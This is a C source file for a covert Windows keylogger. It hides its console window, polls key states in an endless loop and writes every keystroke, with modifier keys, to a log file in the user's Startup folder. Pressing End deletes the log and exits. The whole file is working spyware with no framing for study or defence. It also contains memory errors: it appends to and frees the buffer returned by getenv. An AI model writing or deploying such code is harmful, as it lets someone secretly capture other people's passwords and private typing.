#include <stdio.h>
#include <stdlib.h>
#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <winuser.h>

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    char * word = getenv("appdata");
    strcat(word,"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\log.txt");
    char word1[100]="del \"";
    strcat(word1,word);
    strcat(word1,"\"");

    char * down = (char *) calloc(92,sizeof(char));
    int i;
    FILE *fp;
    while (1)
    {
        Sleep(10); //prevents massive cpu usage
        for(i=8;i<91;i++)
        {
            if(GetAsyncKeyState(i) == 4294934528 && *(down+i)==0)
            {
                fp = fopen(word,"a");
                if(*(down+17)==1) fprintf(fp,"[CTRL]+");
                if(*(down+18)==1) fprintf(fp,"[ALT]+");

                if(i>64 && i<91)
                {
                    if(*(down+16)==1) fprintf(fp,"%c",(char)i);
                    else fprintf(fp,"%c",(char)i+32);
                }
                else
                {
                    if(*(down+16)==1) fprintf(fp,"[SHIFT]+");
                    switch (i){
                        case 8: fprintf(fp,"[Backspace]");break;
                        case 13:fprintf(fp,"[Enter]\n");break;
                        case 17:fprintf(fp,"[CTRL] ");break;
                        case 16:break;
                        case 18:fprintf(fp,"[ALT] ");break;
                        case 20:fprintf(fp,"[Caps Lock]");break;
                        case 27:fprintf(fp,"[ESC]");break;
                        case 35:fclose(fp); //hitting end closes program
                                system(word1);
                                free(down);
                                free(word);
                                exit(0);
                        case 37:break;
                        case 38:break;
                        case 39:break;
                        case 40:break;
                        case 46:fprintf(fp,"[DEL]");break;
                        default:fprintf(fp,"%c",(char)i);break;
                    }
                }
                *(down+i)=1;
                fclose(fp);
            }
            if(GetAsyncKeyState(i) == 0 && *(down+i)==1) *(down+i)=0;
        }
    }
}
